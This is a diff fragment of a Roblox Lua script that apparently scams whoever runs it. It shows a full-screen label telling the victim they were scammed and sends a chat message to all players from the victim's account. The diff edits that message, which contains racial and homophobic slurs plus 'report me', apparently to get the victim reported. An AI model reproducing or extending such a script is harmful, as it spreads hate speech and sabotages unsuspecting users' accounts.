@@ -63,7 +63,7 @@ local lon = Instance.new('TextLabel')
 lon.Parent = cac
 lon.BackgroundTransparency = 1
 lon.TextSize = 50
-lon.Text = 'may bi scam roi nhoc'
+lon.Text = 'may bi scam roi kid'
 lon.TextColor3 = Color3.fromRGB(255,255,255)
 lon.Size = UDim2.new(1,0,1,0)
 repeat wait(1) until game:IsLoaded()
@@ -76,7 +76,7 @@ local args2 = {
 }
 local args = {
 
-    [1] = "report me kid gay nigga lgbt",
+    [1] = "report me kid gay nigga lgbt pussy",
 
     [2] = "All"
 }
